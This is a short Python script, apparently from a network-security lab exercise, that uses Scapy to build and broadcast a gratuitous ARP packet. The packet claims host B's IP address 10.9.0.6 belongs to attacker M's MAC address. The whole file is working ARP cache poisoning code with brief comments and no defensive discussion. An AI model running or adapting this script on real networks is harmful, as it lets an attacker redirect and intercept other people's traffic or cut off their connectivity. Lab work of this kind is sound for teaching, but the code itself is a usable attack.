from scapy.all import *
E = Ether()
E.dst = 'ff:ff:ff:ff:ff:ff' # Ethernet Destination Address for ARP gratuitous packet
A = ARP()
A.hwsrc = '02:42:0a:09:00:69' # ARP Source MAC Address is M's MAC Address
A.psrc = '10.9.0.6' # ARP Source IP Address is B's IP Address (spoofed)
A.hwdst = 'ff:ff:ff:ff:ff:ff' # ARP Destination MAC Address for ARP gratuitous packet
A.pdst = '10.9.0.6' # ARP Destination IP Address is B's IP Address (property of ARP gratuitous packet)
A.op = 1     # 1 for ARP request; 2 for ARP reply
pkt = E/A
sendp(pkt)